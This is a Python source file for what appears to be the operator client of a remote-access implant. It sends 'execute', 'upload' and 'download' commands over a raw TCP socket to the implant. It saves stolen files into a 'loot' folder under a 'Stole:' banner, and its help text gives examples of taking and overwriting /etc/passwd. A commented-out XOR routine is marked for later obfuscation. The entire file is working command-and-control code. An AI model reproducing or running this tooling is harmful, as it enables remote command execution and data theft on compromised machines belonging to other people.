#!/usr/bin/env python3
import os
import socket
import base64
import argparse
import sys


""" xor for later
def xor(toxor: str, xorKey: str) -> bytes:
    key = bytes(xorkey.encode("utf-8"))
    charList = bytes(tochange.encode("utf-8"))
    extended_key = key * (len(charList))
    xord = []
    for x in range(len(charList)):
        xord.append(charList[x]^extended_key[x])

    return bytes(xord)
"""


def b64_file(file_up: str) -> bytes:
    with open(file_up, "rb") as f:
        myFile = f.read()
    myFileB64 = base64.b64encode(myFile)
    return myFileB64


def download(b64_down: str, file_output: str) -> None:
    decode = base64.b64decode(b64_down)
    l00t_folder = "./loot/"
    if os.path.exists(l00t_folder):
        with open(l00t_folder + file_output, "wb") as w:
            w.write(decode)
    else:
        os.mkdir(l00t_folder)
        with open(l00t_folder + file_output, "wb") as w:
            w.write(decode)
    return


def connection(dest: str, dest_port: int, command: str) -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((dest, dest_port))
        s.send(command.encode("utf-8"))
        data = b""
        part = b""
        while True:
            part = s.recv(2048)
            data += part
            if len(part) < 2048:
                break
    return data


def main():
    # parser arguments
    parser = argparse.ArgumentParser(description="Communicates to Implant")
    parser.add_argument(
        "IP", metavar="<destination_ip>", help="Example: ./client.py <destination_host>"
    )
    parser.add_argument(
        "PORT", metavar="<destination_port>", help="Example: ./client.py 127.0.0.1 9999"
    )
    parser.add_argument(
        "--download",
        metavar="<download_file>",
        help="Example: ./client.py 127.0.0.1 9999 --download /path/to/remote/file",
    )
    parser.add_argument(
        "--output_file",
        metavar="<output_file>",
        help="Example: ./client.py 127.0.0.1 9999 --download /etc/passwd --output_file filename.txt",
    )
    parser.add_argument(
        "--upload",
        metavar="<upload_file>",
        help="Example: ./client.py 127.0.0.1 9999 --upload /path/to/upload/file",
    )
    parser.add_argument(
        "--destination_file",
        metavar="<destination_file>",
        help="Example: ./client.py 127.0.0.1 9999 --upload /etc/passwd --destination_file /path/on/remote/server",
    )
    parser.add_argument(
        "--execute",
        metavar="<execute_command>",
        help="Example: ./client.py 127.0.0.1 9999 --execute /bin/ls",
    )

    # variables
    args = parser.parse_args()
    IP = args.IP
    Port = int(args.PORT)
    exec_cmd = args.execute
    # commands#

    # execute
    if args.execute:
        send_cmd = "execute::" + exec_cmd
        recv_command = connection(IP, Port, send_cmd)
        print(recv_command.decode("utf-8"))

    # upload
    elif args.upload:
        file_upload = args.upload
        dest_file_up = args.destination_file
        enc_b64_up = b64_file(file_upload)
        send_cmd = "upload::" + enc_b64_up.decode("utf-8") + "::" + dest_file_up
        recv_back = connection(IP, Port, send_cmd)
        print(recv_back)

    # download
    elif args.download:
        file_download = args.download
        send_cmd = "download::" + file_download
        recv_back = connection(IP, Port, send_cmd)
        message = (
            "Stole: "
            + "\n"
            + "-" * 20
            + "\n"
            + "\n"
            + recv_back.decode("utf-8")
            + "\n"
            + "-" * 20
            + "\n"
        )
        print(message)
        download(recv_back, args.output_file)


if __name__ == "__main__":
    main()
